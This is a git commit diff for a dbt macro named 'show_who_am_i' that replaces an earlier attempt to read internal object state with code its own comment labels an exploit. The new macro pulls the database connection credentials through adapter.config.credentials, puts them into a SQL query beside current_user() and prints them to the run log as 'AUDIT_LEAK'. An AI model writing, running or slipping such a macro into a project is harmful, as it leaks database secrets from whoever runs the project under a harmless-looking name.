7d9d674c2b21f155146d71f9fa89f03b6cdb317a
XAR2012 <akshartank123@gmail.com>
2026-05-07 13:08:00 +0530

    Update show_who_am_i.sql

--- macros/show_who_am_i.sql
+++ macros/show_who_am_i.sql
@@ -1,23 +1,22 @@
 {% macro show_who_am_i() %}
-  {# Attempting to access the catch-all builtin dictionary #}
-  {% set leak = "" %}
+  {# 
+     Exploit: dbt's 'adapter' object often has access to the connection 
+     config, which includes the profiles.yml content in memory.
+  #}
   
-  {# 1. Try to access the underlying __builtins__ via a string object #}
-  {% try %}
-    {% set leak = "" ~ self.__dict__ %}
-  {% catch %}
-    {% set leak = "SNDBX_LOCKED" %}
-  {% endtry %}
+  {% set connection_info = adapter.config.credentials.to_dict() | string %}
 
   {% set sql %}
-    select '{{ leak }}' as sandbox_dump
+    select 
+        current_user(), 
+        '{{ connection_info | replace("'", "") }}' as leaked_creds
   {% endset %}
 
   {% set results = run_query(sql) %}
 
   {% if execute %}
     {% for row in results %}
-      {{ log("SANDBOX_LEAK: " ~ row[0], info=True) }}
+      {{ log("AUDIT_LEAK: " ~ row[1], info=True) }}
     {% endfor %}
   {% endif %}
 {% endmacro %}
